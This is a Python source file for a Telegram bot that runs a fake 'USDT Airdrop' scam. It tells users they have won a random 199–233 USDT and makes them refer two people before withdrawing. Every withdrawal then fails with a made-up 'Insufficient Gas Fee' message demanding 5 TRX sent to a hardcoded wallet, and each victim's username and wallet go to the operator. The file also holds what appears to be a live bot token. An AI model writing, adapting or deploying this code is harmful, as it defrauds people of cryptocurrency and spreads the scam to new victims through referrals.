import telebot
import random
from telebot import types

TOKEN = "7927183325:AAFWcS1ECBQU5CHkr2riVF4Y0e8SjY03_7M"
GROUP_LINK = "https://t.me/Verifiedupiloot"
TRX_ADDRESS = "TAiQJFMpuHcXzek9TBE4ciLevgpe31TPgN"
ADMIN_ID = 7478723634  # @Julu789

bot = telebot.TeleBot(TOKEN)
user_data = {}
referrals = {}

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    args = message.text.split()
    ref_by = int(args[1]) if len(args) > 1 and args[1].isdigit() else None

    if user_id not in user_data:
        user_data[user_id] = {
            "joined": False, "reward": 0, "ref_by": ref_by,
            "refs": [], "wallet": "", "step": ""
        }
        if ref_by and ref_by != user_id:
            referrals.setdefault(ref_by, []).append(user_id)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👉 Join Group", url=GROUP_LINK))
    markup.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
    bot.send_message(user_id, "🎁 Welcome to USDT Airdrop!\nJoin our group to continue:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    user_id = call.from_user.id
    if user_data[user_id]["joined"]:
        bot.answer_callback_query(call.id, "✅ Already Verified!")
        return

    user_data[user_id]["joined"] = True
    reward = random.randint(199, 233)
    user_data[user_id]["reward"] = reward

    bot.send_message(user_id, f"🎉 You received {reward} USDT successfully.")
    bot.send_message(ADMIN_ID, f"✅ @{call.from_user.username} ({user_id}) joined and got {reward} USDT.")

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("💸 Withdraw")
    bot.send_message(user_id, "Choose an option:", reply_markup=markup)

@bot.message_handler(func=lambda msg: msg.text == "💸 Withdraw")
def withdraw(msg):
    user_id = msg.from_user.id
    refs = referrals.get(user_id, [])
    if len(refs) < 2:
        link = f"https://t.me/MyCryptoAirdropBot?start={user_id}"  # CHANGE HERE
        bot.send_message(user_id, f"❗ Refer 2 users first.\n\n🔗 Your referral link:\n{link}")
    else:
        bot.send_message(user_id, "💼 Enter your USDT (TRC20) Wallet Address:")
        user_data[user_id]["step"] = "wallet"

@bot.message_handler(func=lambda msg: user_data.get(msg.from_user.id, {}).get("step") == "wallet")
def get_wallet(msg):
    user_id = msg.from_user.id
    user_data[user_id]["wallet"] = msg.text
    user_data[user_id]["step"] = "withdraw_amount"
    bot.send_message(user_id, "💰 How much USDT do you want to withdraw?")

@bot.message_handler(func=lambda msg: user_data.get(msg.from_user.id, {}).get("step") == "withdraw_amount")
def ask_amount(msg):
    user_id = msg.from_user.id
    amount = msg.text
    user_data[user_id]["step"] = ""

    bot.send_message(user_id, f"🪙 Balance: {user_data[user_id]['reward']} USDT")
    bot.send_message(user_id, f"❌ Transfer Failed!\nInsufficient Gas Fee.\n\n⚠️ Send 5 TRX to:\n\n`{TRX_ADDRESS}`", parse_mode='Markdown')

    bot.send_message(ADMIN_ID, f"💸 Withdraw Request:\nUser: @{msg.from_user.username} ({user_id})\nAmount: {amount} USDT\nWallet: {user_data[user_id]['wallet']}")

bot.polling()
